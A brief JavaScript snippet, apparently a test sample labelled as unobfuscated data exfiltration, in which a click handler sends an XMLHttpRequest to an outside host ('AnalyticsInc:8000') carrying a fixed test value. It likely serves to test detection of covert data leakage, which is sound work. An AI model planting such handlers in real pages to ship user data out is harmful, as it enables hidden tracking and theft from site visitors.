
// addEventListener - No Obfuscation
// Exfiltrate data using XMLHTTP request
document.getElementById('test').addEventListener("click", function(){xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=onclick3", true);xmlhttp.send(null);}, false);
